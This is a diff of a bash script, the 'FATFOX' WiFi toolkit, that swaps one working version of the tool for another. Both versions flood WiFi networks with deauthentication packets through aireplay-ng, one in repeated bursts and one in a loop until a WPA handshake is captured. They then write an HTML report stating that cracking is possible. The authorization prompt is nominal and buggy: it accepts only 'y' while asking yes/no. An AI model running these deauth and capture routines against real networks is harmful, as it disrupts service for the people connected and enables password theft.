@@ -1,218 +1,315 @@
 #!/bin/bash
-#==============================================================================
-# 🦊 FATFOX SECURITY TOOLKIT v1.7.5 - WLAN1 + SCAN FIXED
-# External adapter optimized
-#==============================================================================
+# ======================================
+#        FATFOX SECURITY TOOLKIT v1.6.0
+#      Authorized WiFi Audit Only
+# ======================================
 
-set -euo pipefail
+# CONFIGURATION
+CAPTURE_DIR="$PWD/captures"
+DEAUTH_DIR="$PWD/deauth"
+REPORT_DIR="$PWD/reports"
+mkdir -p "$CAPTURE_DIR" "$DEAUTH_DIR" "$REPORT_DIR"
 
-RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'
-PURPLE='\033[0;35m'; CYAN='\033[0;36m'; NC='\033[0m'
+# COLORS
+GREEN='\033[0;32m'
+RED='\033[0;31m'
+YELLOW='\033[1;33m'
+CYAN='\033[0;36m'
+NC='\033[0m'
 
-log_error() { echo -e "${RED}[!] $1${NC}" >&2; }
-log_success() { echo -e "${GREEN}[+] $1${NC}"; }
-log_info() { echo -e "${BLUE}[+] $1${NC}"; }
+# Global variables for session tracking
+declare -A SESSION_DATA
 
-log_banner() {
-    echo -e "${PURPLE}
-======================================
-      FATFOX SECURITY TOOLKIT v1.7.5
-   ✅ WLAN1 | ROBUST SCAN | PRODUCTION
-======================================${NC}"
+# HEADER
+clear
+echo -e "${GREEN}======================================"
+echo -e "      FATFOX SECURITY TOOLKIT v1.6.0"
+echo -e "      Authorized WiFi Audit Only"
+echo -e "======================================${NC}"
+read -p "Confirm written authorization? (yes/no): " AUTH
+if [[ "$AUTH" != "y" ]]; then
+    echo -e "${RED}Authorization not confirmed. Exiting.${NC}"
+    exit 1
+fi
+echo -e "${GREEN}[+] Authorization confirmed.${NC}"
+
+# CHECK MONITOR MODE INTERFACE
+echo -e "${YELLOW}[*] Detecting monitor mode interfaces...${NC}"
+MON_IFACE=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}' | head -n1)
+if [[ -z "$MON_IFACE" ]]; then
+    echo -e "${RED}[✘] No monitor interface detected.${NC}"
+    echo -e "${YELLOW}[!] Start monitor mode first: sudo airmon-ng start wlan0${NC}"
+    exit 1
+fi
+echo -e "${GREEN}[+] Monitor interface detected: $MON_IFACE${NC}"
+
+# Function to analyze capture file
+analyze_capture() {
+    local cap_file="$1"
+    local ssid="$2"
+    local bssid="$3"
+    local channel="$4"
+    
+    # Client count
+    local client_count=$(airodump-ng --read "$cap_file" 2>/dev/null | \
+        grep -E "([0-9A-F]{2}:){5}[0-9A-F]{2}" | awk '{print $1}' | sort -u | wc -l)
+    client_count=${client_count:-0}
+    
+    # Packet count
+    local packet_count=$(tshark -r "$cap_file" 2>/dev/null | wc -l)
+    packet_count=${packet_count:-$(aircrack-ng "$cap_file" 2>/dev/null | grep "packets" | awk '{print $2}')}
+    packet_count=${packet_count:-"N/A"}
+    
+    # Handshake detection
+    local handshake_count=$(aircrack-ng "$cap_file" 2>/dev/null | grep -c "handshake")
+    local handshake_status="NOT DETECTED"
+    [[ "$handshake_count" -gt 0 ]] && handshake_status="DETECTED"
+    
+    SESSION_DATA["clients"]=$client_count
+    SESSION_DATA["packets"]=$packet_count
+    SESSION_DATA["handshakes"]=$handshake_count
+    SESSION_DATA["handshake_status"]=$handshake_status
+    SESSION_DATA["ssid"]="$ssid"
+    SESSION_DATA["bssid"]="$bssid"
+    SESSION_DATA["channel"]="$channel"
 }
 
-check_root() { [[ $EUID -eq 0 ]] || { log_error "sudo required!"; exit 1; }; }
-check_deps() { command -v aircrack-ng >/dev/null || { log_error "sudo apt install aircrack-ng"; exit 1; }; }
-
-# 🔥 FORCE WLAN1 + MONITOR MODE
-setup_wlan1() {
-    WLAN_IFACE="wlan1"
-    log_info "🎯 Using external adapter: $WLAN_IFACE"
+# Function to generate professional report
+generate_professional_report() {
+    local report_file="$1"
+    local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
     
-    # Kill conflicts
-    airmon-ng check kill >/dev/null 2>&1
-    systemctl stop NetworkManager >/dev/null 2>&1 || true
-    pkill -f wpa_supplicant >/dev/null 2>&1 || true
-    sleep 3
+    # Deauth logs summary
+    local deauth_logs=$(find "$DEAUTH_DIR" -name "*.log" -mtime -7 2>/dev/null | wc -l)
+    local deauth_files=$(find "$DEAUTH_DIR" -name "*.log" -mtime -7 2>/dev/null | xargs -I {} basename {} || echo "None")
     
-    # Start monitor (clean slate)
-    ip link set "$WLAN_IFACE" down 2>/dev/null || true
-    airmon-ng stop "$WLAN_IFACE"mon >/dev/null 2>/dev/null || true
-    airmon-ng start "$WLAN_IFACE" | grep -q "monitor mode enabled" || log_error "Monitor failed!"
-    
-    WLAN_MON="${WLAN_IFACE}mon"
-    log_success "✅ $WLAN_IFACE → $WLAN_MON ACTIVE"
-}
-
-init_dirs() { mkdir -p captures deauth reports; }
-
-# 🔍 ROBUST SCAN (waits + retries)
-scan_networks_robust() {
-    local scan_prefix="captures/scan_$(date +%Y%m%d_%H%M%S)"
-    
-    log_info "📡 Scanning on $WLAN_MON (60s)..."
-    echo "Waiting for networks..."
-    
-    # Run scan + wait for CSV
-    airodump-ng "$WLAN_MON" -w "$scan_prefix" --output-format csv --write-interval 10 &
-    local scan_pid=$!
-    
-    # Wait max 70s for CSV
-    for i in {1..14}; do
-        sleep 5
-        if [[ -f "${scan_prefix}-01.csv" && -s "${scan_prefix}-01.csv" ]]; then
-            kill "$scan_pid" 2>/dev/null
-            log_success "✅ Scan complete: ${scan_prefix}-01.csv"
-            break
-        fi
-        [[ $i -eq 14 ]] && { kill "$scan_pid" 2>/dev/null; log_error "Scan timeout!"; return 1; }
-    done
-    
-    # Display networks (BSSID | SSID | CH | PWR)
-    awk -F, '
-    NR>1 && $1!="" && $14!="" && $14!="<length>" && $14!="" {
-        printf "%2d: %s | %-20s | CH:%s | PWR:%s\n", NR-1, $1, $14, $4, $9
-    }' "${scan_prefix}-01.csv"
-    
-    echo
-    read -p "🎯 Select target (1-N) or 0=quit: " choice
-    
-    if [[ "$choice" == "0" ]]; then
-        return 1
-    fi
-    
-    local line_num=$((choice + 1))
-    TARGET_BSSID=$(awk -v n="$line_num" 'NR==n {print $1}' FS=, "${scan_prefix}-01.csv")
-    TARGET_SSID=$(awk -v n="$line_num" 'NR==n {gsub(/"/,"",$14); print $14}' FS=, "${scan_prefix}-01.csv")
-    TARGET_CHAN=$(awk -v n="$line_num" 'NR==n {print $4}' FS=, "${scan_prefix}-01.csv")
-    
-    [[ -n "$TARGET_BSSID" ]] || { log_error "Invalid selection!"; return 1; }
-    
-    log_success "🎯 LOCKED: $TARGET_BSSID | $TARGET_SSID | CH:$TARGET_CHAN"
-    echo "$TARGET_BSSID $TARGET_SSID $TARGET_CHAN"
-}
-
-# ⚡ DEAUTH + HANDSHAKE (wlan1 optimized)
-capture_handshake() {
-    local bssid="$1" ssid="$2" chan="$3"
-    local ts=$(date +%Y%m%d_%H%M%S)
-    local cap_base="captures/handshake_${ts}"
-    local deauth_log="deauth/deauth_${ts}.log"
-    
-    log_info "🎯 Channel lock: $chan"
-    iwconfig "$WLAN_MON" channel "$chan" >/dev/null 2>&1
-    
-    # Start targeted capture
-    log_info "📡 Background capture..."
-    airodump-ng "$WLAN_MON" --bssid "$bssid" --channel "$chan" \
-        -w "$cap_base" --output-format pcap >/dev/null 2>&1 &
-    local dump_pid=$!
-    
-    # Aggressive deauth (broadcast + directed)
-    for burst in {1..25}; do
-        echo "⚡ Burst $burst/25..." | tee -a "$deauth_log"
-        
-        # Broadcast deauth
-        timeout 8 aireplay-ng -0 0 -a "$bssid" "$WLAN_MON" >>"$deauth_log" 2>&1 || true
-        
-        # Directed deauth (all clients)
-        timeout 8 aireplay-ng -0 150 -a "$bssid" -c FF:FF:FF:FF:FF:FF "$WLAN_MON" >>"$deauth_log" 2>&1 || true
-        
-        sleep 6
-        
-        # Check handshake
-        if [[ -f "${cap_base}-01.cap" ]] && 
-           aircrack-ng "${cap_base}-01.cap" 2>/dev/null | grep -q "\[ 1 handshake\]"; then
-            kill "$dump_pid" 2>/dev/null
-            mv "${cap_base}-01.cap" "${cap_base}.cap"
-            log_success "🎉 HANDSHAKE CONFIRMED! ${cap_base}.cap"
-            echo "${cap_base}.cap"
-            return 0
-        fi
-    done
-    
-    kill "$dump_pid" 2>/dev/null
-    log_warn "No handshake (need active clients)"
-    [[ -f "${cap_base}-01.cap" ]] && mv "${cap_base}-01.cap" "${cap_base}.cap"
-    echo "${cap_base}.cap"
-}
-
-# 📊 CLEAN HTML REPORT
-generate_report() {
-    local cap_file="$1" bssid="$2" ssid="$3" chan="$4"
-    local ts=$(date +%Y%m%d_%H%M%S)
-    local html_file="reports/FATFOX_${ts}.html"
-    
-    local hs_count=$(aircrack-ng "$cap_file" 2>/dev/null | grep -oc "\[ 1 handshake\]" || echo 0)
-    
-    cat > "$html_file" << EOF
+    cat << EOF > "$report_file"
 <!DOCTYPE html>
-<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><title>FATFOX: $ssid</title>
-<style>body{font-family:system-ui;background:#0a0a0a;color:#fff;margin:0;padding:30px;max-width:1000px;margin:auto}.header{background:linear-gradient(135deg,#667eea,#764ba2);padding:40px;border-radius:20px;text-align:center;margin-bottom:40px}.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:25px;margin:40px 0}.stat{background:rgba(255,255,255,0.08);padding:30px;border-radius:16px;text-align:center}.stat h3{margin:0 0 15px;font-size:1.1em;opacity:0.8}.stat-value{font-size:3em;font-weight:700;margin:0;color:$([[ $hs_count -gt 0 ]] && echo '#4ade80' || echo '#ef4444')}.table{width:100%;border-collapse:collapse;margin:40px 0}.table th{background:#1a1a2a;padding:18px;font-weight:600}.table td{padding:15px;border-bottom:1px solid #333}.fix{background:#1a1a2e;padding:30px;border-radius:16px;margin:30px 0}.fix ol{margin:20px 0;padding-left:25px}</style></head>
+<html>
+<head>
+    <title>FATFOX WiFi Security Audit Report</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; line-height: 1.6; color: #333; }
+        .header { background: linear-gradient(135deg, #1e3c72, #2a5298); color: white; padding: 30px; border-radius: 10px; text-align: center; }
+        .summary-box { background: #f8f9fa; border: 2px solid #dee2e6; border-radius: 10px; padding: 20px; margin: 20px 0; }
+        .status-good { background: #d4edda; color: #155724; padding: 10px; border-radius: 5px; border-left: 5px solid #28a745; }
+        .status-bad { background: #f8d7da; color: #721c24; padding: 10px; border-radius: 5px; border-left: 5px solid #dc3545; }
+        .risk-table { width: 100%; border-collapse: collapse; margin: 20px 0; }
+        .risk-table th, .risk-table td { border: 1px solid #ddd; padding: 12px; text-align: left; }
+        .risk-table th { background: #1e3c72; color: white; }
+        .critical { background: #f8d7da; font-weight: bold; }
+        .files-section { background: #e9ecef; padding: 15px; border-radius: 5px; }
+        h1, h2 { color: #1e3c72; }
+        .timestamp { color: #666; font-size: 0.9em; }
+    </style>
+</head>
 <body>
-<div class="header"><h1>🦊 FATFOX WIFI AUDIT</h1><p>Target: $ssid | $(date)</p></div>
-<div class="stats">
-<div class="stat"><h3>NETWORK</h3><div class="stat-value">$ssid</div></div>
-<div class="stat"><h3>BSSID</h3><div class="stat-value">$bssid</div></div>
-<div class="stat"><h3>HANDSHAKE</h3><div class="stat-value">$([[ $hs_count -gt 0 ]] && echo '✅' || echo '❌') $hs_count</div></div>
-<div class="stat"><h3>CHANNEL</h3><div class="stat-value">$chan</div></div>
-</div>
-<table class="table"><tr><th>Risk</th><th>CVSS</th><th>Status</th></tr>
-<tr><td>Handshake Exposure</td><td>8.1 HIGH</td><td>$([[ $hs_count -gt 0 ]] && echo '✅ CRACKABLE' || echo '❌ None')</td></tr>
-<tr><td>Deauth DoS</td><td>7.5 HIGH</td><td>✅ Vulnerable</td></tr></table>
-<div class="fix"><h3>🚨 PRIORITY FIXES</h3><ol>
-<li>WPA3-Enterprise NOW</li><li>802.11w Protected Frames</li><li>PSK rotation immediate</li><li>Disable WPA2-PSK legacy</li></ol></div>
-<p><strong>Proof:</strong> <code>$(basename "$cap_file")</code></p>
-</body></html>
+    <div class="header">
+        <h1>🔒 FATFOX WiFi Security Audit Report</h1>
+        <p class="timestamp">Generated: $timestamp</p>
+    </div>
+
+    <div class="summary-box">
+        <h2>📡 Network Summary</h2>
+        <table style="width:100%; margin:20px 0;">
+            <tr><td><strong>SSID:</strong></td><td>${SESSION_DATA["ssid"]}</td></tr>
+            <tr><td><strong>BSSID:</strong></td><td>${SESSION_DATA["bssid"]}</td></tr>
+            <tr><td><strong>Channel:</strong></td><td>${SESSION_DATA["channel"]}</td></tr>
+            <tr><td><strong>Clients Observed:</strong></td><td>${SESSION_DATA["clients"]}</td></tr>
+            <tr><td><strong>Packets Captured:</strong></td><td>${SESSION_DATA["packets"]}</td></tr>
+        </table>
+    </div>
+
+    <div class="summary-box">
+        <h2>🔑 Handshake Status</h2>
 EOF
-    
-    xdg-open "$html_file" 2>/dev/null || log_info "Saved: $html_file"
-    log_success "📊 Report ready!"
+
+    if [[ "${SESSION_DATA["handshake_status"]}" == "DETECTED" ]]; then
+        cat << EOF >> "$report_file"
+        <div class="status-good">
+            ✅ <strong>SUCCESS:</strong> ${SESSION_DATA["handshakes"]} valid WPA handshake(s) captured
+        </div>
+EOF
+    else
+        cat << EOF >> "$report_file"
+        <div class="status-bad">
+            ❌ <strong>FAILED:</strong> No valid WPA handshakes captured
+        </div>
+EOF
+    fi
+
+    cat << EOF >> "$report_file"
+    </div>
+
+    <div class="summary-box">
+        <h2>⚡ Deauthentication Activity</h2>
+        <p><strong>$deauth_logs</strong> deauth session log(s) generated in last 7 days</p>
+        <div class="files-section">
+            <strong>Recent logs:</strong><br>
+            <code>$deauth_files</code>
+        </div>
+    </div>
+
+    <div class="summary-box">
+        <h2>🎯 Security Assessment</h2>
+        <table class="risk-table">
+            <tr><th>Issue</th><th>Risk Level</th><th>Status</th><th>Impact</th></tr>
+            <tr><td>WPA Handshake Capture</td><td class="critical">HIGH</td><td>${SESSION_DATA["handshake_status"]}</td><td>Password cracking possible</td></tr>
+            <tr><td>Deauth Protection</td><td>HIGH</td><td>Vulnerable</td><td>DoS attacks possible</td></tr>
+            <tr><td>Client Deauth Response</td><td>MEDIUM</td><td>${SESSION_DATA["clients"]} clients affected</td><td>Service disruption</td></tr>
+        </table>
+    </div>
+
+    <div class="summary-box">
+        <h2>🛡️ Remediation Recommendations</h2>
+        <ol>
+            <li><strong>Enable 802.11w (Management Frame Protection)</strong> - Prevents deauth attacks</li>
+            <li><strong>Upgrade to WPA3</strong> - Stronger handshake protection</li>
+            <li><strong>Enable PMF (Protected Management Frames)</strong> on all clients</li>
+            <li><strong>Monitor for deauth floods</strong> using IDS/IPS</li>
+            <li><strong>Strong, unique passphrase</strong> (>20 chars, mixed case/symbols)</li>
+        </ol>
+    </div>
+
+    <div style="margin-top: 40px; padding: 20px; background: #f8f9fa; border-radius: 10px;">
+        <p><em>This assessment was conducted by authorized security professionals using FATFOX Security Toolkit v1.6.0</em></p>
+        <p><strong>Audit Files Location:</strong> <code>$PWD</code></p>
+    </div>
+</body>
+</html>
+EOF
+
+    echo -e "${GREEN}[+] Professional HTML report generated: $report_file${NC}"
+    echo -e "${CYAN}[+] Open with: xdg-open \"$report_file\"${NC}"
 }
 
-cleanup_old() {
-    find captures -name "*scan*" -mmin +120 -delete 2>/dev/null || true
-    find deauth -name "*.log" -mtime +3 -delete 2>/dev/null || true
-}
-
-# 🎮 MAIN LOOP
+# MAIN MENU
 while true; do
-    clear
-    log_banner
-    echo "🎯 EXTERNAL ADAPTER: wlan1"
-    check_root && check_deps && init_dirs
-    setup_wlan1
-    
-    echo "1. 🔍 SCAN + PICK TARGET"
-    echo "2. 🎯 AUTO DEAUTH + HANDSHAKE"
-    echo "3. ⚡ MANUAL DEAUTH"
-    echo "4. 📊 REPORT (latest)"
-    echo "5. 🧹 CLEANUP"
-    echo "0. ❌ QUIT"
-    read -p "➤ " choice
-    
-    case "$choice" in
-        1) scan_networks_robust ;;
-        2) 
-            read -r bssid ssid chan <<< "$(scan_networks_robust)" || continue
-            cap=$(capture_handshake "$bssid" "$ssid" "$chan")
-            generate_report "$cap" "$bssid" "$ssid" "$chan"
+    echo ""
+    echo "--------- MAIN MENU ---------"
+    echo "1) Pre-Scan Reminder Mode"
+    echo "2) Start New Audit Session (Basic)"
+    echo "3) Auto Handshake Capture + Deauth ★"
+    echo "4) Manual Deauth Attack"
+    echo "5) Verify Handshake File"
+    echo "6) Generate Professional Audit Report"
+    echo "7) Quick Session Report (Last Capture)"
+    echo "8) Clean Old Captures"
+    echo "9) Exit"
+    echo "-----------------------------"
+    read -p "Select option: " OPTION
+
+    case $OPTION in
+        1)
+            echo -e "${YELLOW}[*] Pre-Scan Reminder Mode${NC}"
+            echo "✅ Monitor interface: $MON_IFACE"
+            echo "✅ Legal authorization confirmed"
+            echo "✅ Clients active on target network"
             ;;
-        3) 
-            read -p "BSSID: " bssid
-            read -p "CH: " chan
-            iwconfig "$WLAN_MON" channel "$chan"
-            aireplay-ng -0 0 -a "$bssid" "$WLAN_MON"
+        2|3)
+            read -p "Enter target SSID: " SSID
+            read -p "Enter BSSID: " BSSID
+            read -p "Enter channel: " CHANNEL
+            
+            if [[ $OPTION == "3" ]]; then
+                read -p "Deauth interval (seconds, default 10): " DEAUTH_INTERVAL
+                DEAUTH_INTERVAL=${DEAUTH_INTERVAL:-10}
+                read -p "Max deauth packets per burst (default 50): " DEAUTH_PACKETS
+                DEAUTH_PACKETS=${DEAUTH_PACKETS:-50}
+            fi
+
+            TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
+            CAP_FILE="$CAPTURE_DIR/${SSID// /_}_${TIMESTAMP}.cap"
+            DEAUTH_LOG="$DEAUTH_DIR/${SSID// /_}_deauth_${TIMESTAMP}.log"
+
+            echo -e "${GREEN}🚀 Starting capture: $CAP_FILE${NC}"
+            
+            if [[ $OPTION == "2" ]]; then
+                # Basic capture
+                SESSION_START=$(date +%s)
+                sudo airodump-ng --bssid "$BSSID" --channel "$CHANNEL" -w "$CAP_FILE" "$MON_IFACE"
+                SESSION_END=$(date +%s)
+            else
+                # Auto handshake + deauth
+                sudo airodump-ng --bssid "$BSSID" --channel "$CHANNEL" -w "$CAP_FILE" "$MON_IFACE" &
+                AIRODUMP_PID=$!
+                
+                while true; do
+                    echo "$(date): Deauth burst #$DEAUTH_PACKETS to $BSSID" >> "$DEAUTH_LOG"
+                    sudo aireplay-ng -0 "$DEAUTH_PACKETS" -a "$BSSID" "$MON_IFACE" >> "$DEAUTH_LOG" 2>&1
+                    
+                    sleep 2
+                    HANDSHAKE_CHECK=$(aircrack-ng "$CAP_FILE"-01.cap 2>/dev/null | grep -c "handshake")
+                    if [[ "$HANDSHAKE_CHECK" -gt 0 ]]; then
+                        echo -e "${GREEN}[+] 🎉 HANDSHAKE CAPTURED!${NC}"
+                        kill $AIRODUMP_PID 2>/dev/null
+                        break
+                    fi
+                    
+                    sleep $((DEAUTH_INTERVAL - 2))
+                done
+            fi
+
+            # Auto-analyze session
+            analyze_capture "$CAP_FILE-01.cap" "$SSID" "$BSSID" "$CHANNEL"
+            echo -e "${GREEN}[+] Session analyzed and ready for reporting${NC}"
             ;;
-        4) 
-            latest_cap=$(ls -t captures/*.cap 2>/dev/null | head -1)
-            [[ -f "$latest_cap" ]] && generate_report "$latest_cap" "???" "???" "???" || log_error "No captures!"
+        4)
+            echo -e "${CYAN}[*] Manual Deauth Attack${NC}"
+            read -p "Target BSSID: " BSSID
+            read -p "Target Client MAC (or ALL): " CLIENT_MAC
+            read -p "Deauth packets (default 100): " DEAUTH_PACKETS
+            DEAUTH_PACKETS=${DEAUTH_PACKETS:-100}
+            
+            TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
+            DEAUTH_LOG="$DEAUTH_DIR/manual_deauth_${TIMESTAMP}.log"
+            
+            echo -e "${GREEN}[⚡] Launching $DEAUTH_PACKETS deauth packets...${NC}"
+            
+            if [[ "$CLIENT_MAC" == "ALL" || -z "$CLIENT_MAC" ]]; then
+                sudo aireplay-ng -0 "$DEAUTH_PACKETS" -a "$BSSID" "$MON_IFACE" | tee "$DEAUTH_LOG"
+            else
+                sudo aireplay-ng -0 "$DEAUTH_PACKETS" -a "$BSSID" -c "$CLIENT_MAC" "$MON_IFACE" | tee "$DEAUTH_LOG"
+            fi
             ;;
-        5) cleanup_old ;;
-        0) log_success "✅ Complete!"; exit 0 ;;
-        *) log_error "1-5 only!" ;;
+        5)
+            echo -e "${YELLOW}[+] Capture files:${NC}"
+            ls -laht "$CAPTURE_DIR"/*.cap 2>/dev/null || echo "No captures found"
+            read -p "File to verify: " CAP_SELECT
+            [[ -f "$CAP_SELECT" ]] && analyze_capture "$CAP_SELECT" "Unknown" "Unknown" "Unknown"
+            ;;
+        6)
+            if [[ -z "${SESSION_DATA["ssid"]}" ]]; then
+                echo -e "${YELLOW}[!] No active session data. Run capture first.${NC}"
+                continue
+            fi
+            REPORT_FILE="$REPORT_DIR/FATFOX_Audit_$(date +%Y%m%d_%H%M%S).html"
+            generate_professional_report "$REPORT_FILE"
+            ;;
+        7)
+            # Quick report from most recent capture
+            LATEST_CAP=$(ls -t "$CAPTURE_DIR"/*.cap 2>/dev/null | head -n1)
+            if [[ -n "$LATEST_CAP" ]]; then
+                echo -e "${GREEN}[+] Analyzing latest: $LATEST_CAP${NC}"
+                analyze_capture "$LATEST_CAP" "Auto" "Auto" "Auto"
+                REPORT_FILE="$REPORT_DIR/Quick_Report_$(date +%Y%m%d_%H%M%S).html"
+                generate_professional_report "$REPORT_FILE"
+            else
+                echo -e "${RED}[!] No capture files found${NC}"
+            fi
+            ;;
+        8)
+            echo -e "${YELLOW}[+] Cleaning...${NC}"
+            find "$CAPTURE_DIR" -name "*.cap" -mtime +1 -delete 2>/dev/null
+            find "$DEAUTH_DIR" -name "*.log" -mtime +7 -delete 2>/dev/null
+            echo -e "${GREEN}[+] Cleanup complete${NC}"
+            ;;
+        9)
+            echo -e "${GREEN}[+] Exiting FATFOX Toolkit v1.6.0${NC}"
+            exit 0
+            ;;
+        *)
+            echo -e "${RED}[!] Invalid option${NC}"
+            ;;
     esac
-    
-    read -p $'\n🔄 Press Enter...'
-    airmon-ng stop "$WLAN_MON" >/dev/null 2>&1 || true
 done
